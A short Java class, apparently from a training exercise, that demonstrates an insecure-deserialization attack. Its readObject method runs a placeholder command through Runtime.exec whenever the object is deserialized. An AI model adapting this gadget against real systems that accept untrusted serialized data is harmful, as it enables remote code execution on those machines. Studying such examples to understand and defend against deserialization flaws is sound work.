package com.ing.java.ex2.evil;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class EvilPerson implements Serializable {
    private void readObject(ObjectInputStream serialized) throws ClassNotFoundException, IOException {
        System.out.println("!!!EVIL CODE EXECUTION!!!");
        Runtime.getRuntime().exec(new String[]{"evil_command"});
    }
}
